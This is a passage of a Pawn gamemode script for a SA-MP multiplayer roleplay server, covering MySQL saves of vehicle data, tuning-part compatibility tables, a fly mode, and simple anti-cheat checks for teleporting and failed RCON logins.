			CarInfo[vehicleid][mod13],
			CarInfo[vehicleid][mod14],
			CarInfo[vehicleid][mod15],
			CarInfo[vehicleid][mod16],
			CarInfo[vehicleid][mod17],
			vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cPaintJx:
        {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `PaintJ`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cPaintJ],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cDaysx:
        {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `days`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cDays],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
		case cPortbagaj:
        {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Arma1`='%d',`Arma2`='%d',`Arma3`='%d',`GArma1`='%d',`GArma2`='%d',`GArma3`='%d', `Droguri`='%d',`Bani`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][vArma1],
			CarInfo[vehicleid][vArma2],CarInfo[vehicleid][vArma3],CarInfo[vehicleid][vGArma1],
			CarInfo[vehicleid][vGArma2],CarInfo[vehicleid][vGArma3],CarInfo[vehicleid][vDroguri],CarInfo[vehicleid][vBani],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	}
	return 1;
}

stock IsACBUGWeapon(playerid)
{
	if (IsPlayerConnected(playerid) && (gPlayerLogged[playerid] == 1))
	{
	    new wID = GetPlayerWeapon ( playerid ) ;
	    if (wID == 24 || wID == 25 || wID == 27 || wID == 34 ) return 1 ;
	}
	return 0 ;
}

stock GetPlayerID(playername[])
{
  	for(new i = 0; i < MAX_PLAYERS; i++)
  	{
    	if(IsPlayerConnected(i))
    	{
      		new playername2[MAX_PLAYER_NAME];
      		GetPlayerName(i, playername2, sizeof(playername2));
      		if(strcmp(playername2, playername, true, strlen(playername)) == 0)
      		{
        		return i;
      		}
    	}
  	}
  	return -1;
}

forward ClearWanted(playerid);
public ClearWanted(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		new string[80];
		format(string,sizeof(string),"None");
		strmid(WantedName[playerid], string, 0, strlen(string), 255);
		WantedReason[playerid] = 999;
		thiefmoney[playerid] = 0;
		thiefplayer[playerid] = 999;
		WantedReason[playerid] = 1;
		omoarathief[playerid] = 1;
		KillTimer(WantedTimer[playerid]);
	}
	return 1;
}
/*		if( !( -1000.0 <= fX <= 1000.0 ) || !( -1000.0 <= fY <= 1000.0 ) || !( -1000.0 <= fZ <= 1000.0 ) ) // a valid offset, it's impossible that a offset bigger than 1000 is legit (also less than -1000.0 is impossible, not used by this hack, but still, let's check for it, just for the future, who knows what hacks will appear). The object with biggest offset is having ~700-800 radius.
		{
			return 1; // let's desynchronize that bullet, so players won't crash
}
	}
    return 1;
}*/
stock PutPlayerInVehicleEx(playerid,vehicleid,seatid)
{
	PlayerEnterTime[playerid]+=221;
	PutPlayerInVehicle(playerid,vehicleid,seatid);
	p_ac[playerid] = 1;
	return 1;
}

stock RemovePlayerFromVehicleEx(playerid)
{
	PlayerEnterTime[playerid]+=221;
	RemovePlayerFromVehicle(playerid);
	return 1;
}

public OnQueryError( errorid, error[ ], callback[ ], query[ ], connectionHandle )
{
	print( "====================================================================" );
	printf( "Error ID: %d, Error: %s", errorid, error );
	printf( "Callback: %s", callback );
	printf( "gQuery: %s", query );
	print( "====================================================================" );
	return 1;
}

FindIP(StrToChk[])
{
	new IpLevel = 0;
	for(new a = 0; a < strlen(StrToChk); a++)
	{
		switch(IpLevel)
		{
			case 0:
			{
	    		if(IsNum(StrToChk[a])) IpLevel++;
			}
			case 1, 2:
			{
                if(IsNum(StrToChk[a])) IpLevel++;
                else if(StrToChk[a] == '.') IpLevel = 4;
                else IpLevel = 0;
			}
			case 3:
			{
			    if(StrToChk[a] == '.') IpLevel++;
			    else IpLevel = 0;
			}
			case 4:
			{
			    if(IsNum(StrToChk[a])) IpLevel++;
			    else IpLevel = 0;
			}
			case 5, 6:
			{
                if(IsNum(StrToChk[a])) IpLevel++;
                else if(StrToChk[a] == '.') IpLevel = 8;
                else IpLevel = 0;
			}
			case 7:
			{
			    if(StrToChk[a] == '.') IpLevel++;
			    else IpLevel = 0;
			}
			case 8:
			{
			    if(IsNum(StrToChk[a])) IpLevel++;
			    else IpLevel = 0;
			}
			case 9, 10:{
                if(IsNum(StrToChk[a])) IpLevel++;
                else if(StrToChk[a] == '.') IpLevel = 12;
                else IpLevel = 0;
			}
			case 11:
			{
			    if(StrToChk[a] == '.') IpLevel++;
			    else IpLevel = 0;
			}
			case 12:
			{
			    if(IsNum(StrToChk[a])) return 1;
                else IpLevel = 0;
   			}
  		}
	}
	return 0;
}
forward Hacks();
public Hacks()
{
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(!IsPlayerInRangeOfPoint(i, 400.0, LastPosition[i][0], LastPosition[i][1], LastPosition[i][2]) && GetPlayerState(i) != PLAYER_STATE_PASSENGER && GetPlayerSurfingVehicleID(i) == INVALID_VEHICLE_ID && TeleportAllowed[i] == 1)
            {
                if(TeleportAllowed[i] == 0)
				{
                    SendClientMessage(i, 0xFF0000FF, "You hack :(");
                    TeleportWarnings[i] ++;
                    if(TeleportWarnings[i] >= 3)
                    {
                        BanEx(i, "Teleporting");
                    }
                }
                else
                {
                    SetTimerEx("TeleportFix", 1500, false, "i", i);
                }
            }
            GetPlayerPos(i, LastPosition[i][0], LastPosition[i][1], LastPosition[i][2]);
        }
    }
    return 1;
}
stock strmatch(const String1[], const String2[])
{
 	if ((strcmp(String1, String2, true, strlen(String2)) == 0) && (strlen(String2) == strlen(String1)))
 	{
  		return true;
 	}
 	else
 	{
  		return false;
 	}
}
stock SetPlayerPosEx(playerid, Float:X, Float:Y, Float:Z)
{
    TeleportAllowed[playerid] = 1;
    SetPlayerPos(playerid, X, Y, Z);
    SetCameraBehindPlayer(playerid);
}
function NumIp(ip[], playerid)
{
 	new ips = 0;
  	foreach(new i : Player)
 	{
  		if(i == playerid) continue;
  		new playerip[16];
  		GetPlayerIp(i,playerip,sizeof(playerip));
		if(strmatch(ip, playerip)) ips++;
 	}
 	return ips;
}
forward TeleportFix(playerid);
public TeleportFix(playerid)
{
    TeleportAllowed[playerid] = 0;
    return 1;
}
IsNum(textchar)
{
	if(textchar == '0') return 1;
	if(textchar == '1') return 1;
	if(textchar == '2') return 1;
	if(textchar == '3') return 1;
	if(textchar == '4') return 1;
	if(textchar == '5') return 1;
	if(textchar == '6') return 1;
	if(textchar == '7') return 1;
	if(textchar == '8') return 1;
	if(textchar == '9') return 1;
	return 0;
}
public OnRconLoginAttempt(ip[], password[], success)
{
	new doarodata = 0;
  	if(!success)
  	{
  	    new pip[16];
  	    for(new i = 0; i < MAX_PLAYERS; i++)
  	    {
			if(doarodata == 0)
			{
				if(IsPlayerConnected(i))
				{
					GetPlayerIp(i, pip, sizeof(pip));
					if(!strcmp(ip, pip, true))
					{
						if(PlayerInfo[i][pAdmin] < 7)
						{
							Kick(i);
							doarodata = 1;
						}
					}
				}
			}	
		}
  	}
  	return 1;
}
InitFly(playerid)
{
	OnFly[playerid] = false;
	return;
}

bool:StartFly(playerid)
{
	if(OnFly[playerid])
        return false;
    OnFly[playerid] = true;
	new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid,x,y,z);
	SetPlayerPos(playerid,x,y,z+5.0);
	ApplyAnimation(playerid,"PARACHUTE","PARA_steerR",6.1,1,1,1,1,0,1);
	GameTextForPlayer(playerid,"~y~Fly mode~n~~r~~k~~PED_FIREWEAPON~ ~w~- increase height~n~~r~RMB ~w~- reduce height~n~\
	~r~~k~~PED_SPRINT~ ~w~- increase speed~n~\
	~r~~k~~SNEAK_ABOUT~ ~w~- reduce speed",10000,3);
	return true;
}
public Fly()
{
	for(new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	{
		if(IsPlayerConnected(playerid))
		{
			if(OnFly[playerid])
			{
				new k, ud,lr;
				GetPlayerKeys(playerid,k,ud,lr);
				new Float:v_x,Float:v_y,Float:v_z,
					Float:x,Float:y,Float:z;
				if(ud < 0)	
				{
					GetPlayerCameraFrontVector(playerid,x,y,z);
					v_x = x+0.1;
					v_y = y+0.1;
				}
				if(k & 128)	
					v_z = -0.2;
				else if(k & KEY_FIRE)	// up
					v_z = 0.2;
				if(k & KEY_WALK)	// slow
				{
					v_x /=5.0;
					v_y /=5.0;
					v_z /=5.0;
				}
				if(k & KEY_SPRINT)	// fast
				{
					v_x *=4.0;
					v_y *=4.0;
					v_z *=4.0;
				}
				if(v_z == 0.0) 
					v_z = 0.025;
				SetPlayerVelocity(playerid,v_x,v_y,v_z);
				if(v_x == 0 && v_y == 0)
				{	
					if(GetPlayerAnimationIndex(playerid) == 959)	
						ApplyAnimation(playerid,"PARACHUTE","PARA_steerR",6.1,1,1,1,1,0,1);
				}
				else 
				{
					GetPlayerCameraFrontVector(playerid,v_x,v_y,v_z);
					GetPlayerCameraPos(playerid,x,y,z);
					SetPlayerLookAt(playerid,v_x*500.0+x,v_y*500.0+y);
					if(GetPlayerAnimationIndex(playerid) != 959)
						ApplyAnimation(playerid,"PARACHUTE","FALL_SkyDive_Accel",6.1,1,1,1,1,0,1);
				}
			}	
		}		
	}	
	return 1;
}
bool:StopFly(playerid)
{
	if(!OnFly[playerid])
        return false;
	new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid,x,y,z);
	SetPlayerPos(playerid,x,y,z);
	OnFly[playerid] = false;
	return true;
}

static SetPlayerLookAt(playerid,Float:x,Float:y)
{
	new Float:Px, Float:Py, Float: Pa;
	GetPlayerPos(playerid, Px, Py, Pa);
	Pa = floatabs(atan((y-Py)/(x-Px)));
	if (x <= Px && y >= Py) 		Pa = floatsub(180.0, Pa);
	else if (x < Px && y < Py) 		Pa = floatadd(Pa, 180.0);
	else if (x >= Px && y <= Py)	Pa = floatsub(360.0, Pa);
	Pa = floatsub(Pa, 90.0);
	if (Pa >= 360.0) 
		Pa = floatsub(Pa, 360.0);
	SetPlayerFacingAngle(playerid, Pa);
	return;
}
stock IsComponentidCompatible( modelid, componentid ) 
{
    if(componentid == 1025 || componentid == 1073 || componentid == 1074 || componentid == 1075 || componentid == 1076 ||
		componentid == 1077 || componentid == 1078 || componentid == 1079 || componentid == 1080 || componentid == 1081 ||
        componentid == 1082 || componentid == 1083 || componentid == 1084 || componentid == 1085 || componentid == 1096 ||
        componentid == 1097 || componentid == 1098 || componentid == 1087 || componentid == 1086) {
        return componentid;
	}
    switch(modelid) 
	{
        case 400: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 ) return componentid;
        case 401: if( componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 114 || componentid == 1020 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 402: if( componentid == 1009 || componentid == 1009 || componentid == 1010 ) return componentid;
        case 404: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007) return componentid;
        case 405: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1023 || componentid == 1000) return componentid;
        case 409: if( componentid == 1009 ) return componentid;
        case 410: if( componentid == 1019 || componentid == 1021 || componentid == 1020 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 411: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 412: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 415: if( componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 418: if( componentid == 1020 || componentid == 1021 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016) return componentid;
        case 419: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 420: if( componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1003) return componentid;
        case 421: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1016 || componentid == 1000) return componentid;
        case 422: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007) return componentid;
        case 426: if( componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003) return componentid;
        case 429: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 436: if( componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 438: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 439: if( componentid == 1003 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1013) return componentid;
        case 442: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 445: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 451: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 458: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 466: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 467: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 474: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 475: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 477: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007) return componentid;
        case 478: if( componentid == 1005 || componentid == 1004 || componentid == 1012 || componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 479: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 480: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 489: if( componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016 || componentid == 1000) return componentid;
        case 491: if( componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 492: if( componentid == 1005 || componentid == 1004 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1016 || componentid == 1000) return componentid;
        case 496: if( componentid == 1006 || componentid == 1017 || componentid == 1007 || componentid == 1011 || componentid == 1019 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1003 || componentid == 1002 || componentid == 1142 || componentid == 1143 || componentid == 1020) return componentid;
        case 500: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 506: if( componentid == 1009) return componentid;
        case 507: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 516: if( componentid == 1004 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1015 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007) return componentid;
        case 517: if( componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 518: if( componentid == 1005 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 526: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 527: if( componentid == 1021 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1015 || componentid == 1017 || componentid == 1007) return componentid;
        case 529: if( componentid == 1012 || componentid == 1011 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 533: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 534: if( componentid == 1126 || componentid == 1127 || componentid == 1179 || componentid == 1185 || componentid == 1100 || componentid == 1123 || componentid == 1125 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1180 || componentid == 1178 || componentid == 1101 || componentid == 1122 || componentid == 1124 || componentid == 1106) return componentid;
        case 535: if( componentid == 1109 || componentid == 1110 || componentid == 1113 || componentid == 1114 || componentid == 1115 || componentid == 1116 || componentid == 1117 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1120 || componentid == 1118 || componentid == 1121 || componentid == 1119) return componentid;
        case 536: if( componentid == 1104 || componentid == 1105 || componentid == 1182 || componentid == 1181 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1184 || componentid == 1183 || componentid == 1128 || componentid == 1103 || componentid == 1107 || componentid == 1108) return componentid;
        case 540: if( componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007) return componentid;
        case 541: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 542: if( componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1015) return componentid;
        case 545: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 546: if( componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007) return componentid;
        case 547: if( componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1016 || componentid == 1003 || componentid == 1000) return componentid;
        case 549: if( componentid == 1012 || componentid == 1011 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 550: if( componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003) return componentid;
        case 551: if( componentid == 1005 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003) return componentid;
        case 555: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 558: if( componentid == 1092 || componentid == 1089 || componentid == 1166 || componentid == 1165 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1168 || componentid == 1167 || componentid == 1088 || componentid == 1091 || componentid == 1164 || componentid == 1163 || componentid == 1094 || componentid == 1090 || componentid == 1095 || componentid == 1093) return componentid;
        case 559: if( componentid == 1065 || componentid == 1066 || componentid == 1160 || componentid == 1173 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1159 || componentid == 1161 || componentid == 1162 || componentid == 1158 || componentid == 1067 || componentid == 1068 || componentid == 1071 || componentid == 1069 || componentid == 1072 || componentid == 1070 || componentid == 1009) return componentid;
        case 560: if( componentid == 1028 || componentid == 1029 || componentid == 1169 || componentid == 1170 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1141 || componentid == 1140 || componentid == 1032 || componentid == 1033 || componentid == 1138 || componentid == 1139 || componentid == 1027 || componentid == 1026 || componentid == 1030 || componentid == 1031) return componentid;
        case 561: if( componentid == 1064 || componentid == 1059 || componentid == 1155 || componentid == 1157 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1154 || componentid == 1156 || componentid == 1055 || componentid == 1061 || componentid == 1058 || componentid == 1060 || componentid == 1062 || componentid == 1056 || componentid == 1063 || componentid == 1057) return componentid;
        case 562: if( componentid == 1034 || componentid == 1037 || componentid == 1171 || componentid == 1172 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1149 || componentid == 1148 || componentid == 1038 || componentid == 1035 || componentid == 1147 || componentid == 1146 || componentid == 1040 || componentid == 1036 || componentid == 1041 || componentid == 1039) return componentid;
        case 565: if( componentid == 1046 || componentid == 1045 || componentid == 1153 || componentid == 1152 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1150 || componentid == 1151 || componentid == 1054 || componentid == 1053 || componentid == 1049 || componentid == 1050 || componentid == 1051 || componentid == 1047 || componentid == 1052 || componentid == 1048) return componentid;
        case 566: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 567: if( componentid == 1129 || componentid == 1132 || componentid == 1189 || componentid == 1188 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1187 || componentid == 1186 || componentid == 1130 || componentid == 1131 || componentid == 1102 || componentid == 1133) return componentid;
        case 575: if( componentid == 1044 || componentid == 1043 || componentid == 1174 || componentid == 1175 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1176 || componentid == 1177 || componentid == 1099 || componentid == 1042) return componentid;
        case 576: if( componentid == 1136 || componentid == 1135 || componentid == 1191 || componentid == 1190 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1192 || componentid == 1193 || componentid == 1137 || componentid == 1134) return componentid;
        case 579: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 580: if( componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007) return componentid;
        case 585: if( componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 587: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 589: if( componentid == 1005 || componentid == 1004 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1024 || componentid == 1013 || componentid == 1006 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007) return componentid;
        case 600: if( componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1022 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007) return componentid;
        case 602: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 603: if( componentid == 1144 || componentid == 1145 || componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007) return componentid;
    }
    return false;
}
stock TuningTDControl( playerid, bool:show ) 
{
	if( show == true ) 
	{
        for( new i = 0; i < 15; i ++ ) 
		{
			PlayerTextDrawShow( playerid, TuningBuy[ playerid ][ i ] );
		}
		for(new i = 0; i < sizeof(TuneTD); i++) PlayerTextDrawHide(playerid, TuneTD[i]);

	}
	else if(show == false) 
	{
		for( new i = 0; i < 15; i ++) 
		{
			PlayerTextDrawHide( playerid, TuningBuy[ playerid ][ i ]);
		}
		for(new i = 0; i < sizeof(TuneTD); i++) PlayerTextDrawShow(playerid, TuneTD[i]);

	}
}
AntiDeAMX()
{
	new a[][] =
 	{
 		"Unarmed (Fist)",
 		"Brass K"
 	};
	#pragma unused a

}
